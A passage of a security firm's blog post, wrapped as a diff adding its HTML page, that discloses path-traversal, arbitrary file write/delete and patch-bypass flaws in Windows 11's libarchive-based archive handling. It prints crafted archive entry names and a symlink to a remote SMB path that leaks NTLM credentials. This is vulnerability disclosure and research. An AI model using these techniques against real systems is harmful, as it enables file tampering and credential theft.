@@ -1,0 +1,1146 @@
+
+
+<!DOCTYPE html>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta charset="utf-8" />
+    <link href="/images/favicon.png" rel="icon" size="32x32">
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>From Convenience to Contagion: The Half-Day Threat and Libarchive Vulnerabilities Lurking in Windows 11 | DEVCORE</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <meta name="description" property="og:description" content="Windows 11's KB5031455 update adds RAR and 7z support via libarchive, but DEVCORE discovered multiple vulnerabilities, including Heap Buffer Overflow and arbitrary file operations. Delayed patching also enables “Half-day” attacks, putting projects like ClickHouse at risk. A step forward in convenience—or a hidden security threat?" />
+    <meta name="keywords" content="CVE-2024-26185, CVE-2024-38165, CVE-2024-48957, CVE-2024-48958" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="From Convenience to Contagion: The Half-Day Threat and Libarchive Vulnerabilities Lurking in Windows 11 | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11-en/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20250212/cover.png" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="From Convenience to Contagion: The Half-Day Threat and Libarchive Vulnerabilities Lurking in Windows 11 | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="Windows 11's KB5031455 update adds RAR and 7z support via libarchive, but DEVCORE discovered multiple vulnerabilities, including Heap Buffer Overflow and arbitrary file operations. Delayed patching also enables “Half-day” attacks, putting projects like ClickHouse at risk. A step forward in convenience—or a hidden security threat?">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20250212/cover.png">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11-en/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-GHXJ9PS005');
+    </script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body class="en">
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Services<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/services/red-team/">
+                            <div class="item">
+
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    Red Team Assessment
+                                </h2>
+                                <p class="two-line">
+                                    Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    Penetration Testing
+                                </h2>
+                                <p class="two-line">
+                                    Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    Security Consulting
+                                </h2>
+                                <p class="two-line">
+                                    Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    Security Training
+                                </h2>
+                                <p class="two-line">
+                                    Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.
+                                </p>
+                            </div>
+                        </a>
+
+                    </div>
+                </div>
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Research<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    Overview
+                                </h2>
+                                <p class="two-line">
+                                    Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    Competitions and Awards
+                                </h2>
+                                <p class="two-line">
+                                    Awards from international cybersecurity competitions.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    Enterprise Vulnerability Reports
+                                </h2>
+                                <p class="two-line">
+                                    Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    International Conferences
+                                </h2>
+                                <p class="two-line">
+                                    Sharing vulnerability research and security knowledge at international cybersecurity conferences.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE List
+                                </h2>
+                                <p class="two-line">
+                                    Discovery of critical vulnerabilities in leading international products and services.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>Company<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                Company Overview
+                            </h2>
+                            <p>
+                                Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment,  Penetration Testing, Security Consulting, and Security Training.
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/en/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    Team Members
+                                </h2>
+                                <p class="two-line">
+                                    Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    Achievements
+                                </h2>
+                                <p class="two-line">
+                                    DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    Corporate Social Responsibility
+                                </h2>
+                                <p class="two-line">
+                                    We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    Job Opportunities
+                                </h2>
+                                <p class="two-line">
+                                    Join us to secure the world and improve the cybersecurity industry together.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>News<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/en/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    Latest news
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    Media Resources
+                                </h2>
+                                <p>
+                                    Media Kit, Logo and Usage Guideline
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/search/">Search</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/contact/">Contact</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>Services</span>
+                <div class="menuItem">
+                    <a href="/en/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                Red Team Assessment
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                Penetration Testing
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                Security Consulting
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                Security Training
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>Research</span>
+                <div class="menuItem">
+                    <a href="/en/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/awards/">
+                        <div class="item">
+                            <h2>Competitions and Awards</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Enterprise Vulnerability Reports</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/talks/">
+                        <div class="item">
+                            <h2>International Conferences</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/cve/">
+                        <div class="item">
+                            <h2>CVE List</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>Company</span>
+                <div class="menuItem">
+                    <a href="/en/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>Company Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/our-team/">
+                        <div class="item">
+                            <h2>Team Members</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/history/">
+                        <div class="item">
+                            <h2>Achievements</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/csr/">
+                        <div class="item">
+                            <h2>Corporate Social Responsibility</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/jobs/">
+                        <div class="item">
+                            <h2>Job Opportunities</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>News</span>
+                <div class="menuItem">
+                    <a href="/en/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/en/media-kit/">
+                        <div class="item">
+                            <h2>Media Resources</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/en/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                Search
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                Contact
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/en/blog/">All Articles</a>
+                </li>
+                <li>
+                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
+                </li>
+                <li>
+                    <a href="/en/media-kit/">Media Resources</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
+                    <span class="tag">
+
+                      <a href="/en/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/en/blog/tag/Windows/">#Windows</a> <a href="/en/blog/tag/Advisory/">#Advisory</a> <a href="/en/blog/tag/CVE/">#CVE</a> 
+                    </span>
+                    <h1>
+                        From Convenience to Contagion: The Half-Day Threat and Libarchive Vulnerabilities Lurking in Windows 11
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/en/blog/author/terrynini">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/nini.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/en/blog/author/terrynini">Terrynini</a></span>
+                        <span class="date">2025-02-12</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20250212/cover.png"/>
+                    </div>
+                    
+
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<h2 id="abstract">Abstract</h2>
+<p>In the October 2023 update, Windows 11 introduced support for 11 additional compression formats, including RAR and 7z, allowing users to manage these types of files natively within File Explorer. The enhancement significantly improves convenience; however, it also introduces potential security risks. To support these various compression formats, Windows 11 utilizes the libarchive library, a well-established open-source library used across multiple operating systems like Linux, BSD, and macOS, and in major projects such as ClickHouse, Homebrew, and Osquery.</p>
+
+<p>The libarchive has been continuously fuzzed by Google’s OSS-Fuzz project, making it a time-tested library. However, its coverage in OSS-Fuzz has been less than ideal. In addition to the two remote code execution (RCE) vulnerabilities disclosed by Microsoft Offensive Research &amp; Security Engineering (MORSE) in January, we have identified several vulnerabilities in libarchive through code review and fuzzing. These include a heap buffer overflow vulnerability in the RAR decompression and arbitrary file write and delete vulnerabilities due to insufficient checks of libarchive’s output on Windows. Additionally, in our presentation, we will reveal several interesting features that emerged from the integration of libarchive with Windows.</p>
+
+<p>And whenever vulnerabilities are discovered in widely-used libraries like libarchive, their risks often permeate every corner, making it difficult to estimate the potential hazards. Moreover, when Microsoft patches Windows, the corresponding fixes are not immediately merged into libarchive. This delay gives attackers the opportunity to exploit other projects using libarchive. For example, the vulnerabilities patched by Microsoft in January were not merged into libarchive until May, leaving countless applications exposed to risk for four months. The worst part is that the developers might not know the vulnerability details or even be aware of its existence. To illustrate this situation, we will use the vulnerabilities we reported to ClickHouse as an example to demonstrate how attackers can exploit the vulnerabilities while libarchive remains unpatched.</p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Before the KB5031455 update, Windows 11 only supported ZIP archives natively. In File Explorer, ZIP files are labeled “Compressed (zipped) Folder.” Users can double-click a ZIP file to view its contents:</p>
+
+<p><img src="/assets/img/blog/20250212/1.png" alt="" /></p>
+
+<p>Or, even better, add new files to the archive or open existing ones directly:
+<img src="/assets/img/blog/20250212/2.png" alt="" /></p>
+
+<p>When a user double-clicks a file inside a ZIP archive, File Explorer extracts it to a temporary folder with a randomly generated UUID under the <code class="language-plaintext highlighter-rouge">%temp%</code> directory. The file is accessed from this temporary location, and since it’s a temporary file, it will be automatically deleted later:</p>
+
+<p><img src="/assets/img/blog/20250212/3.png" alt="" /></p>
+
+<h3 id="compressed-archived-folder">Compressed Archived Folder</h3>
+
+<p>Next, after the KB5031455 update in October 2023, Windows 11 added support for 11 new archive file formats:
+<img src="/assets/img/blog/20250212/4.png" alt="" /></p>
+
+<p>This kind of file is labeled “Compressed Archive Folder” by File Explorer:
+<img src="/assets/img/blog/20250212/5.png" alt="" /></p>
+
+<p>Curious about how Windows 11 supports these 11 new archive file formats, we began analyzing File Explorer and the related DLL files. The native support for ZIP in File Explorer is handled by <code class="language-plaintext highlighter-rouge">zipfldr.dll</code>.</p>
+
+<p>After the KB5031455 update, a new class called <code class="language-plaintext highlighter-rouge">ArchiveFolder</code> was added, distinct from the old <code class="language-plaintext highlighter-rouge">CZipFolder</code> class used to support ZIP Files.</p>
+
+<p><img src="/assets/img/blog/20250212/6.png" alt="" /></p>
+
+<h3 id="first-vulnerability-cve-2024-26185">First Vulnerability: CVE-2024-26185</h3>
+
+<p>Before firing up IDA, we first conducted black-box testing on the new “Compressed Archive Folder” feature. When it comes to extracting files, <code class="language-plaintext highlighter-rouge">../</code> is a timeless trick.</p>
+
+<p>In the first test case, we constructed a file named <code class="language-plaintext highlighter-rouge">..\poc.txt</code>, compressed it into an RAR file, and then uploaded it to a Windows machine to open it by double-clicking. There was no Path Traversal; we only saw an empty folder:</p>
+
+<p><img src="/assets/img/blog/20250212/7.png" alt="" /></p>
+
+<p>We constructed a file named <code class="language-plaintext highlighter-rouge">123\..\poc.txt</code> in the second test case. Because the <code class="language-plaintext highlighter-rouge">123</code> was canceled out by <code class="language-plaintext highlighter-rouge">..</code>, we only saw the <code class="language-plaintext highlighter-rouge">poc.txt</code> solely in File Explore, and still no Path Traversal:</p>
+
+<p><img src="/assets/img/blog/20250212/8.png" alt="" /></p>
+
+<p>There is also no Path Traversal in the corresponding temp folder:
+<img src="/assets/img/blog/20250212/9.png" alt="" /></p>
+
+<p>Excluding “double-clicking,” users will see <code class="language-plaintext highlighter-rouge">Extract All</code> if they right-click on “Compressed (zipped) Folder” or “Compressed Archive Folder” in File Explorer.
+The <code class="language-plaintext highlighter-rouge">Extract All</code> will try to decompress the whole archive. Let’s test “Compressed Archive Folder” again with that:</p>
+
+<p>When using <code class="language-plaintext highlighter-rouge">Extract All</code>,<code class="language-plaintext highlighter-rouge">..\poc.txt</code> is considered an attempt to escape to the parent directory, causing File Explorer to display an error:
+<img src="/assets/img/blog/20250212/10.png" alt="" /></p>
+
+<p>The extraction of <code class="language-plaintext highlighter-rouge">123\..\poc.txt</code> is a success, but we still only got the <code class="language-plaintext highlighter-rouge">poc.txt</code>.
+<img src="/assets/img/blog/20250212/11.png" alt="" /></p>
+
+<p>Because <code class="language-plaintext highlighter-rouge">Extract All</code> decompresses the whole archive, we think we should also test the situation when the file name is an absolute path, for example, <code class="language-plaintext highlighter-rouge">C:\poc\poc.txt</code>:
+<img src="/assets/img/blog/20250212/12.png" alt="" /></p>
+
+<p>There is no error, but the folder <code class="language-plaintext highlighter-rouge">C:</code> was renamed to <code class="language-plaintext highlighter-rouge">C_</code>. Thus, we now know <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> will sanitize the input to avoid Path Traversal or Arbitrary File Write.
+<img src="/assets/img/blog/20250212/13.png" alt="" /></p>
+
+<p>But if one “double-clicks” the RAR file, which contains a file with absolute path name, instead of “Extract All,” it will show a <code class="language-plaintext highlighter-rouge">Local Disk (C:)</code> folder! The <code class="language-plaintext highlighter-rouge">C:</code> isn’t replaced with <code class="language-plaintext highlighter-rouge">C_</code>!</p>
+
+<p><img src="/assets/img/blog/20250212/14.png" alt="" /></p>
+
+<p>Besides that, everything seemed normal, even when we navigated to the innermost folder and opened the <code class="language-plaintext highlighter-rouge">poc.txt</code> file:
+<img src="/assets/img/blog/20250212/15.png" alt="" /></p>
+
+<p>Except for the fact that the extra <code class="language-plaintext highlighter-rouge">poc</code> folder is under our <code class="language-plaintext highlighter-rouge">C</code> volume!
+<img src="/assets/img/blog/20250212/16.png" alt="" /></p>
+
+<p>That means File Explorer considers here a place to put its temporary files; thus, the <code class="language-plaintext highlighter-rouge">poc.txt</code> file is also here, inside the <code class="language-plaintext highlighter-rouge">poc</code> folder:
+<img src="/assets/img/blog/20250212/17.png" alt="" /></p>
+
+<p>In other words, we have discovered an Arbitrary File Write vulnerability! Since this write operation aims to place temporary files, the files will be deleted after a while. Therefore, what we have actually found is an Arbitrary File Write/Delete vulnerability. But it’s a shame that the permissions used for both writing and deleting are limited to the current user’s privileges.</p>
+
+<p>That’s <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26185">CVE-2024-26185</a>, a funny yet useless vulnerability. To exploit it to create or delete a file in a specific location, you would need to create the exact same path structure within the archive and then trick the user into opening every folder and double-clicking the target file. Most people would probably find it suspicious halfway through the process.</p>
+
+<p>Well, that may be true, but according to the rules, Microsoft still has to pay me $1,000. Yay!</p>
+
+<p><img src="/assets/img/blog/20250212/18.png" alt="" /></p>
+
+<h3 id="cve-2024-26185-root-cause">CVE-2024-26185: Root Cause</h3>
+
+<p>The root cause of CVE-2024-26185 is the insufficient filtering of file names. After decompiling the <code class="language-plaintext highlighter-rouge">zipfldr.dll</code>, we found it will call <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> to sanitize the file name before decompression. The function replaces <code class="language-plaintext highlighter-rouge">"*:&lt;&gt;?|</code> with <code class="language-plaintext highlighter-rouge">_</code> and <code class="language-plaintext highlighter-rouge">/</code> with <code class="language-plaintext highlighter-rouge">\</code>.</p>
+
+<p>Additionally, when interacting with the “Compressed (zipped) Folder” or “Compressed Archive Folder,” users have three methods to extract files, each triggering a different function:</p>
+
+<ul>
+  <li>Double-clicking a file inside the archive
+    <ul>
+      <li>Triggers <code class="language-plaintext highlighter-rouge">ExtractFromArchiveByIndex</code></li>
+    </ul>
+  </li>
+  <li>Double-clicking a cmd, bat, or exe file inside the archive
+    <ul>
+      <li>Triggers <code class="language-plaintext highlighter-rouge">ExtractEntireArchive</code></li>
+    </ul>
+  </li>
+  <li>Right-clicking the archive and selecting “Extract All” from the menu
+    <ul>
+      <li>Triggers <code class="language-plaintext highlighter-rouge">ArchiveExtractWizard::ExtractToDestination</code></li>
+    </ul>
+  </li>
+</ul>
+
+<p>All of them use <code class="language-plaintext highlighter-rouge">archive_read_next_header</code> to get the file names in the archive, <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> to sanitize the file name, and <code class="language-plaintext highlighter-rouge">ExtractArchiveEntry</code> to actually extract the file. However, they forgot to call <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> in <code class="language-plaintext highlighter-rouge">ExtractFromArchiveByIndex</code>, which is triggered when “Double-clicking a file inside the archive,” leading to the arbitrary file write and arbitrary file delete vulnerabilities.
+<img src="/assets/img/blog/20250212/19.png" alt="" /></p>
+
+<h3 id="cve-2024-38165-bypassing-the-patch-for-cve-2024-26185">CVE-2024-38165: Bypassing the Patch for CVE-2024-26185</h3>
+
+<p>After Microsoft patched CVE-2024-26185, we randomly picked some PoCs created a while ago and executed them to check the patch’s correctness. It turns out that some of our PoCs are still working!?</p>
+
+<p>In the patch, they add a <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> before 
+<code class="language-plaintext highlighter-rouge">ExtractFromArchiveByIndex</code> to sanitize the file name. It looks perfect:
+<img src="/assets/img/blog/20250212/20.png" alt="" /></p>
+
+<p>However, it can be easily bypassed by <code class="language-plaintext highlighter-rouge">\poc\poc.txt</code>. How does that happen? Let’s follow the code step by step. First, the file name <code class="language-plaintext highlighter-rouge">\poc\poc.txt</code> is passed into <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code>. Since there are no invalid characters in the file name, the output is still <code class="language-plaintext highlighter-rouge">\poc\poc.txt</code>:</p>
+
+<p><img src="/assets/img/blog/20250212/21.png" alt="" /></p>
+
+<p>Next, because <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> is currently “extracting file to a temporary folder under the <code class="language-plaintext highlighter-rouge">%TEMP%</code> to let users interact with it,” the file name should be concatenated with the path of the temporary folder to construct the destination of extraction:
+<img src="/assets/img/blog/20250212/22.png" alt="" /></p>
+
+<p>But here comes the problem, in Windows, <code class="language-plaintext highlighter-rouge">C:\</code> and <code class="language-plaintext highlighter-rouge">\</code> are both considered as root. In other words, <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> is currently concatenating two absolute paths! According to <a href="https://github.com/microsoft/STL/blob/90820002693fe6eaaec2e55884472c654186207e/stl/inc/filesystem#L723">the STL implemented by Microsoft</a>, if two arguments of <code class="language-plaintext highlighter-rouge">std::filesystem::operator/</code> are both absolute paths, it will return the second argument directly. Thus, the function’s return value is  <code class="language-plaintext highlighter-rouge">C:\poc\poc.txt</code>, causing a patch bypass.
+<img src="/assets/img/blog/20250212/23.png" alt="" /></p>
+
+<h3 id="symlink-ntlm-exfiltration">Symlink NTLM Exfiltration</h3>
+
+<p>Of course, it’s vulnerable without <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code>. But can we still exploit File Explorer even if <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> is used correctly? This function only filters <code class="language-plaintext highlighter-rouge">"*:&lt;&gt;?|</code>, meaning <code class="language-plaintext highlighter-rouge">.</code> can still be used to construct a remote path. Could NTLM exfiltration still be possible? We attempted to construct paths such as:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">\\172.23.176.34\Users\nini\Desktop\sharing\test.txt</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\Device\Mup\172.23.176.34\Users\nini\Desktop\sharing\test.txt</code></li>
+</ul>
+
+<p>While these are regular files, they only create a corresponding directory under the <code class="language-plaintext highlighter-rouge">C:</code> volume (before the CVE-2024-38165 fix). However, if we create a symlink pointing to <code class="language-plaintext highlighter-rouge">\\172.23.176.34\poc\poc.txt</code>, when the user either double-clicks the symlink or selects “Extract All,” File Explorer will attempt to communicate with the SMB server at that IP address, leading to an NTLM leak:</p>
+
+<p><img src="/assets/img/blog/20250212/24.png" alt="" /></p>
+
+<p>Moreover, Windows determines the file type within the archive based solely on the file extension, which can be highly misleading. For example, in this case, our symlink file was recognized as a Text Document:</p>
+
+<p><img src="/assets/img/blog/20250212/25.png" alt="" /></p>
+
+<p>However, <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> uses the <a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-createsymboliclinka"><code class="language-plaintext highlighter-rouge">CreateSymbolicLinkA</code></a> API to create a symlink during decompression. Although this API requires elevated privileges, File Explorer won’t prompt for privilege escalation and will simply display an error message instead.
+<img src="/assets/img/blog/20250212/26.png" alt="" /></p>
+
+<p>Even though File Explorer adds the <code class="language-plaintext highlighter-rouge">SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE</code> flag when using <code class="language-plaintext highlighter-rouge">CreateSymbolicLinkA</code>, the documentation states that Developer Mode must be enabled for this flag to take effect.
+<img src="/assets/img/blog/20250212/27.png" alt="" /></p>
+
+<p>The “extracting symlink from archive” feature appears to be incomplete, limiting the vulnerability to attacks targeting administrators or developers. As a result, it does not meet MSRC’s threshold for immediate servicing. Therefore, they will not provide ongoing updates on the status of the fix and have closed this case.</p>
+
+<h2 id="libarchive">Libarchive</h2>
+
+<p>In the previous section, we mentioned that <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> is responsible for handling interactions with the “Compressed (zipped) Folder” and “Compressed Archive Folder.”</p>
+
+<p>In this section, we’ll talk about the <code class="language-plaintext highlighter-rouge">archiveint.dll</code>, which is actually a forked version of libarchive. Libarchive is a powerful, open-source library for handling archive file formats. It is used across multiple operating systems like Linux, BSD, and macOS, as well as in projects such as ClickHouse, Homebrew, and Osquery. Google’s OSS-Fuzz project has continuously fuzzed it 24/7 since 2016, making it a time-tested library.</p>
+
+<p>By black-box testing, we observed several interesting behaviors.</p>
+
+<h3 id="fun-fact-1-windows-supports-file-formats-more-than-they-claimed">Fun Fact 1: Windows Supports File Formats More Than They Claimed</h3>
+
+<p>Although Microsoft claimed to have added native support for the following 11 archive formats in the KB5031455 update, the actual number of supported file formats far exceeds 11.
+<img src="/assets/img/blog/20250212/28.png" alt="" /></p>
+
+<p>This is how Windows initialize libarchive in <code class="language-plaintext highlighter-rouge">zipfldr.dll</code>:
+<img src="/assets/img/blog/20250212/29.png" alt="" /></p>
+
